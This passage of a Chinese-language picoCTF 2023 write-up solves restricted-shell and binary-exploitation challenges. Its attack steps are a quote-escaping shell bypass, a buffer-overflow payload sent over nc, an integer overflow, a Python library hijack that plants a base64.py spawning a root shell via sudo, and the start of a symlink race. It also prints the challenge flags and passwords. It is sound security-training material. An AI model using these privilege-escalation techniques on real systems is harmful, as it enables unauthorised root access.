<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">$ ssh picoplayer@saturn.picoctf.net -p 64196</span><br><span class="line">picoplayer@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line">Last login: Thu Mar 30 07:37:22 2023 from 114.36.17.55</span><br><span class="line">picoplayer@challenge:~$ ls</span><br><span class="line">useless</span><br><span class="line">picoplayer@challenge:~$ cat useless</span><br><span class="line">#!/bin/bash</span><br><span class="line"># Basic mathematical operations via command-line arguments</span><br><span class="line"></span><br><span class="line">if [ $# != 3 ]</span><br><span class="line">then</span><br><span class="line">  echo &quot;Read the code first&quot;</span><br><span class="line">else</span><br><span class="line">        if [[ &quot;$1&quot; == &quot;add&quot; ]]</span><br><span class="line">        then</span><br><span class="line">          sum=$(( $2 + $3 ))</span><br><span class="line">          echo &quot;The Sum is: $sum&quot;</span><br><span class="line"></span><br><span class="line">        elif [[ &quot;$1&quot; == &quot;sub&quot; ]]</span><br><span class="line">        then</span><br><span class="line">          sub=$(( $2 - $3 ))</span><br><span class="line">          echo &quot;The Substract is: $sub&quot;</span><br><span class="line"></span><br><span class="line">        elif [[ &quot;$1&quot; == &quot;div&quot; ]]</span><br><span class="line">        then</span><br><span class="line">          div=$(( $2 / $3 ))</span><br><span class="line">          echo &quot;The quotient is: $div&quot;</span><br><span class="line"></span><br><span class="line">        elif [[ &quot;$1&quot; == &quot;mul&quot; ]]</span><br><span class="line">        then</span><br><span class="line">          mul=$(( $2 * $3 ))</span><br><span class="line">          echo &quot;The product is: $mul&quot;</span><br><span class="line"></span><br><span class="line">        else</span><br><span class="line">          echo &quot;Read the manual&quot;</span><br><span class="line"></span><br><span class="line">        fi</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<p>原本以為是要做Command Injection，但找不到植入點，後來看到他的標籤寫了<code>man</code>，想說隨便打個<code>man</code>的指令，結果就得到flag了= =</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ man useless</span><br><span class="line"></span><br><span class="line">useless</span><br><span class="line">     useless, — This is a simple calculator script</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">     useless, [add sub mul div] number1 number2</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">     Use the useless, macro to make simple calulations like addition,subtraction, multiplication and division.</span><br><span class="line"></span><br><span class="line">Examples</span><br><span class="line">     ./useless add 1 2</span><br><span class="line">       This will add 1 and 2 and return 3</span><br><span class="line"></span><br><span class="line">     ./useless mul 2 3</span><br><span class="line">       This will return 6 as a product of 2 and 3</span><br><span class="line"></span><br><span class="line">     ./useless div 6 3</span><br><span class="line">       This will return 2 as a quotient of 6 and 3</span><br><span class="line"></span><br><span class="line">     ./useless sub 6 5</span><br><span class="line">       This will return 1 as a remainder of substraction of 5 from 6</span><br><span class="line"></span><br><span class="line">Authors</span><br><span class="line">     This script was designed and developed by Cylab Africa</span><br><span class="line"></span><br><span class="line">     picoCTF&#123;us3l3ss_ch4ll3ng3_3xpl0it3d_5562&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Special"><a href="#Special" class="headerlink" title="Special"></a>Special</h2><div class="note danger flat"><p>AUTHOR: LT ‘SYREAL’ JONES</p>
<p>Description<br>Don’t power users get tired of making spelling mistakes in the shell? Not anymore! Enter Special, the Spell Checked Interface for Affecting Linux. Now, every word is properly spelled and capitalized… automatically and behind-the-scenes! Be the first to test Special in beta, and feel free to tell us all about how Special streamlines every development process that you face. When your co-workers see your amazing shell interface, just tell them: That’s Special (TM)<br>Start your instance to see connection details.<br>Additional details will be available after launching your challenge instance.<br><strong>300 Points</strong></p>
</div>

<p>這題是個看似正常的shell，但他會把我們打進去的指令做處理，除了把第一個字大寫之外，還會用其他的英文單字來取代指令，讓我們沒辦法執行正常的指令。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 50295 ctf-player@saturn.picoctf.net</span><br><span class="line">ctf-player@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 07:54:44 2023 from 127.0.0.1</span><br><span class="line">Special$ ls</span><br><span class="line">Is</span><br><span class="line">sh: 1: Is: not found</span><br><span class="line">Special$ pwd</span><br><span class="line">Pod</span><br><span class="line">sh: 1: Pod: not found</span><br></pre></td></tr></table></figure>

<p>這個時候第一個想到的當然就是用前面用過的<code>/bin/sh</code>等shell來執行，但嘗試了各種shell都被擋下了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Special$ /bin/sh</span><br><span class="line">Why go back to an inferior shell?</span><br><span class="line">Special$ /bin/bash</span><br><span class="line">Why go back to an inferior shell?</span><br><span class="line">Special$ /bin/zsh</span><br><span class="line">Why go back to an inferior shell?</span><br></pre></td></tr></table></figure>

<p>這個時候就想到了用特殊字元來繞過這個限制，這次嘗試之後發現可行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Special$ &quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</span><br><span class="line">&quot;w&quot;h&quot;o&quot;a&quot;m&quot;i</span><br><span class="line">ctf-player</span><br></pre></td></tr></table></figure>

<p>那我們用特殊字元來繞過shell的限制就可以了，如下所示，我們成功得到shell的正常執行權限，用前面的方法來取得flag即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Special$ \/\b\i\n/////s\h</span><br><span class="line">\/\b\i\n/////s\h</span><br><span class="line">$ ls</span><br><span class="line">blargh</span><br><span class="line">$ cat /challenge/metadata.json</span><br><span class="line">&#123;&quot;flag&quot;: &quot;picoCTF&#123;5p311ch3ck_15_7h3_w0r57_6a2763f6&#125;&quot;, &quot;password&quot;: &quot;af86add3&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Specialer"><a href="#Specialer" class="headerlink" title="Specialer"></a>Specialer</h2><div class="note danger flat"><p>AUTHOR: LT ‘SYREAL’ JONES, ET AL.</p>
<p>Description<br>Reception of Special has been cool to say the least. That’s why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just ‘Specialer’. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody’s complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer.<br>Additional details will be available after launching your challenge instance.<br><strong>400 Points</strong></p>
</div>

<p>這題跟上面那題十分類似，差別在於這次改成限制可以執行哪些指令了，在shell裡按兩次tab可以看有哪些指令可以執行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -p 55013 ctf-player@saturn.picoctf.net</span><br><span class="line">ctf-player@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Specialer$</span><br><span class="line">!          bind       compopt    elif       fc         if         printf     shift      true       while</span><br><span class="line">./         break      continue   else       fg         in         pushd      shopt      type       &#123;</span><br><span class="line">:          builtin    coproc     enable     fi         jobs       pwd        source     typeset    &#125;</span><br><span class="line">[          caller     declare    esac       for        kill       read       suspend    ulimit</span><br><span class="line">[[         case       dirs       eval       function   let        readarray  test       umask</span><br><span class="line">]]         cd         disown     exec       getopts    local      readonly   then       unalias</span><br><span class="line">alias      command    do         exit       hash       logout     return     time       unset</span><br><span class="line">bash       compgen    done       export     help       mapfile    select     times      until</span><br><span class="line">bg         complete   echo       false      history    popd       set        trap       wait</span><br></pre></td></tr></table></figure>

<p>第一個看到的就是<code>echo</code>，他有一個特殊的用法可以用來當作<code>cat</code>使用，用法是<code>echo $(&lt;filename)</code>，用這個方法就能讀取檔案了，而且用tab的方法可以觀察在<code>~</code>有三個可疑的資料夾，看起來flag就是在裡面，看看每個檔案的內容就能發現flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Specialer$ echo ./(tab)</span><br><span class="line">.hushlogin  .profile    abra/       ala/        sim/</span><br><span class="line">Specialer$ echo ./ala/(tab)</span><br><span class="line">kazam.txt  mode.txt</span><br><span class="line">Specialer$ echo $(&lt;./ala/mode.txt)</span><br><span class="line">Yummy! Ice cream!</span><br><span class="line">Specialer$ echo $(&lt;./ala/kazam.txt)</span><br><span class="line">return 0 picoCTF&#123;y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_38f5cc78&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h1><p>最後是PWN的題目了，這個類別原本以為自己解不出多少，結果沒想到最後解了5/7題，算是有大大的進步，希望以後也可以多多訓練自己的PWN能力:P最好是Reverse跟PWN一起練XD</p>
<h2 id="babygame01"><a href="#babygame01" class="headerlink" title="babygame01"></a>babygame01</h2><div class="note success flat"><p>AUTHOR: PALASH OSWAL</p>
<p>Description<br>Get the flag and reach the exit.<br>Welcome to BabyGame! Navigate around the map and see what you can find! The game is available to download here. There is no source available, so you’ll have to figure your way around the map. You can connect with it using nc saturn.picoctf.net 61841.<br><strong>100 Points</strong></p>
</div>

<p>歷年來picoCTF的Binary Exploitation第一題都是buffer overflow，今年也不例外，給了一個超級詭異的binary還不給source code，稍微逆向一下可以知道<code>l</code>指令可以改變自己的符號，<code>p</code>可以快速通關，而<code>wasd</code>則可以移動方向。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 61841</span><br><span class="line"></span><br><span class="line">Player position: 4 4</span><br><span class="line">End tile position: 29 89</span><br><span class="line">Player has flag: 0</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">....@.....................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">..........................................................................................</span><br><span class="line">.........................................................................................X</span><br></pre></td></tr></table></figure>

<p>可以看到我們的flag數量為0，合理的猜想就是利用buffer overflow來改變我們flag的數量，這樣到終點時就可以拿到flag了。經過多次嘗試後，構造以下payload獲得flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ echo -e $(python3 -c &#x27;print(&quot;a&quot;*368 + &quot;p&quot;)&#x27;) | nc saturn.picoctf.net 61841</span><br><span class="line">...</span><br><span class="line">You win!</span><br><span class="line">flage</span><br><span class="line">picoCTF&#123;gamer_m0d3_enabled_0a880baf&#125;</span><br></pre></td></tr></table></figure>

<h2 id="two-sum"><a href="#two-sum" class="headerlink" title="two-sum"></a>two-sum</h2><div class="note success flat"><p>AUTHOR: MUBARAK MIKAIL</p>
<p>Description<br>Can you solve this?<br>What two positive numbers can make this possible: <code>n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</code><br>Enter them here <code>nc saturn.picoctf.net 61849</code>. Source<br><strong>100 Points</strong></p>
</div>

<p>這題應該是這個類別裡最簡單的了，透過題目可以很明顯發現這題需要做的是integer overflow，在C語言裡int最大是2147483647，因此可以很輕易的構造我們的payload，輸入進去就可以得到flag了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nc saturn.picoctf.net 61849</span><br><span class="line">n1 &gt; n1 + n2 OR n2 &gt; n1 + n2</span><br><span class="line">What two positive numbers can make this possible:</span><br><span class="line">2147483647 1</span><br><span class="line">You entered 2147483647 and 1</span><br><span class="line">You have an integer overflow</span><br><span class="line">YOUR FLAG IS: picoCTF&#123;Tw0_Sum_Integer_Bu773R_0v3rfl0w_fe14e9e9&#125;</span><br></pre></td></tr></table></figure>

<h2 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h2><div class="note danger flat"><p>AUTHOR: THEONESTE BYAGUTANGAZA</p>
<p>Description<br>Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with.<br>Through Social engineering, we’ve got the credentials to use on the server. SSH is running on the server.<br><strong>200 Points</strong></p>
</div>

<p>這題是privilege_escalation，常見在python library的濫用，我們可以連進去看看他給了些什麼。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ ssh picoctf@saturn.picoctf.net -p 61768</span><br><span class="line">picoctf@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 08:40:58 2023 from 114.36.17.55</span><br><span class="line">picoctf@challenge:~$ ls -al</span><br><span class="line">total 16</span><br><span class="line">drwxr-xr-x 1 picoctf picoctf   20 Mar 30 08:40 .</span><br><span class="line">drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..</span><br><span class="line">-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc</span><br><span class="line">drwx------ 2 picoctf picoctf   34 Mar 30 08:40 .cache</span><br><span class="line">-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile</span><br><span class="line">-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py</span><br><span class="line">picoctf@challenge:~$ cat .server.py</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">import socket</span><br><span class="line">ip = &#x27;picoctf.org&#x27;</span><br><span class="line">response = os.system(&quot;ping -c 1 &quot; + ip)</span><br><span class="line">#saving ping details to a variable</span><br><span class="line">host_info = socket.gethostbyaddr(ip)</span><br><span class="line">#getting IP from a domaine</span><br><span class="line">host_info_to_str = str(host_info[2])</span><br><span class="line">host_info = base64.b64encode(host_info_to_str.encode(&#x27;ascii&#x27;))</span><br><span class="line">print(&quot;Hello, this is a part of information gathering&quot;,&#x27;Host: &#x27;, host_info)</span><br></pre></td></tr></table></figure>

<p>有一個<code>.server.py</code>，有root權限，裡面引用了base64、os跟socket三個library，因此我們可以在家目錄構造<code>base64.py</code>，讓<code>.server.py</code>去引用我們所構造的惡意library並執行他，讓我們得到root權限。首先我們要構造<code>base64.py</code>，內容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>這個內容可以讓我們拿到shell，接著用下面的指令去執行<code>.server.py</code>就能拿到shell了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for picoctf on challenge:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User picoctf may run the following commands on challenge:</span><br><span class="line">    (ALL) /usr/bin/vi</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py</span><br><span class="line">picoctf@challenge:~$ sudo -u root /usr/bin/python3 /home/picoctf/.server.py</span><br><span class="line"># ls</span><br><span class="line">__pycache__  base64.py</span><br><span class="line"># cat /challenge/metadata.json</span><br><span class="line">&#123;&quot;flag&quot;: &quot;picoCTF&#123;pYth0nn_libraryH!j@CK!n9_6924176e&#125;&quot;, &quot;username&quot;: &quot;picoctf&quot;, &quot;password&quot;: &quot;rZSsB--vJK&quot;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="tic-tac"><a href="#tic-tac" class="headerlink" title="tic-tac"></a>tic-tac</h2><div class="note danger flat"><p>AUTHOR: JUNIAS BONOU</p>
<p>Description<br>Someone created a program to read text files; we think the program reads files with root privileges but apparently it only accepts to read files that are owned by the user running it.<br>Additional details will be available after launching your challenge instance.<br><strong>200 Points</strong></p>
</div>

<p>這題從標籤來看是toctou attack的題目，主要的內容是讓兩個檔案來搶連結到root權限的東西，這樣我們就有機會讀取到原本只有root可以讀取的檔案。先連進去看看有什麼東西。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">$ ssh ctf-player@saturn.picoctf.net -p 63641</span><br><span class="line">ctf-player@saturn.picoctf.net&#x27;s password:</span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.15.0-1031-aws x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Mar 30 08:56:23 2023 from 127.0.0.1</span><br><span class="line">ctf-player@pico-chall$ ls -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player    20 Mar 30 08:56 .</span><br><span class="line">drwxr-xr-x 1 root       root          24 Mar 16 02:27 ..</span><br><span class="line">drwx------ 2 ctf-player ctf-player    34 Mar 30 08:56 .cache</span><br><span class="line">-rw-r--r-- 1 root       root          67 Mar 16 02:28 .profile</span><br><span class="line">-rw------- 1 root       root          32 Mar 16 02:28 flag.txt</span><br><span class="line">-rw-r--r-- 1 ctf-player ctf-player   912 Mar 16 01:30 src.cpp</span><br><span class="line">-rwsr-xr-x 1 root       root       19016 Mar 16 02:28 txtreader</span><br><span class="line">ctf-player@pico-chall$ cat src.cpp</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;fstream&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">  if (argc != 2) &#123;</span><br><span class="line">    std::cerr &lt;&lt; &quot;Usage: &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;filename&gt;&quot; &lt;&lt; std::endl;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  std::string filename = argv[1];</span><br><span class="line">  std::ifstream file(filename);</span><br><span class="line">  struct stat statbuf;</span><br><span class="line"></span><br><span class="line">  // Check the file&#x27;s status information.</span><br><span class="line">  if (stat(filename.c_str(), &amp;statbuf) == -1) &#123;</span><br><span class="line">    std::cerr &lt;&lt; &quot;Error: Could not retrieve file information&quot; &lt;&lt; std::endl;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Check the file&#x27;s owner.</span><br><span class="line">  if (statbuf.st_uid != getuid()) &#123;</span><br><span class="line">    std::cerr &lt;&lt; &quot;Error: you don&#x27;t own this file&quot; &lt;&lt; std::endl;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Read the contents of the file.</span><br><span class="line">  if (file.is_open()) &#123;</span><br><span class="line">    std::string line;</span><br><span class="line">    while (getline(file, line)) &#123;</span><br><span class="line">      std::cout &lt;&lt; line &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    std::cerr &lt;&lt; &quot;Error: Could not open file&quot; &lt;&lt; std::endl;</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br><span class="line">ctf-player@pico-chall$ ./txtreader flag.txt</span><br><span class="line">Error: you don&#x27;t own this file</span><br></pre></td></tr></table></figure>

<p>裡面有一個<code>txtreader</code>，是個toctou attack常見的東西，要進行toctou，首先我們需要構造一個搶權限用的檔案。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ touch asd</span><br></pre></td></tr></table></figure>

<p>接著我們利用<code>ln</code>指令將<code>flag.txt</code>軟連結到另一個檔案上。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ctf-player@pico-chall$ ln -s flag.txt flag</span><br><span class="line">ctf-player@pico-chall$ ls -alh</span><br><span class="line">total 56K</span><br><span class="line">drwxr-xr-x 1 ctf-player ctf-player  72 Mar 30 09:19 .</span><br><span class="line">drwxr-xr-x 1 root       root        24 Mar 16 02:27 ..</span><br><span class="line">drwx------ 2 ctf-player ctf-player  34 Mar 30 09:18 .cache</span><br><span class="line">drwxrwxr-x 3 ctf-player ctf-player  19 Mar 30 09:18 .local</span><br><span class="line">-rw-r--r-- 1 root       root        67 Mar 16 02:28 .profile</span><br><span class="line">lrwxrwxrwx 1 ctf-player ctf-player   8 Mar 30 09:19 flag -&gt; flag.txt</span><br><span class="line">-rw------- 1 root       root        32 Mar 16 02:28 flag.txt</span><br><span class="line">-rwxrwxr-x 1 ctf-player ctf-player 17K Mar 30 09:18 race</span><br><span class="line">-rw-rw-r-- 1 ctf-player ctf-player 295 Mar 30 09:18 race.c</span><br><span 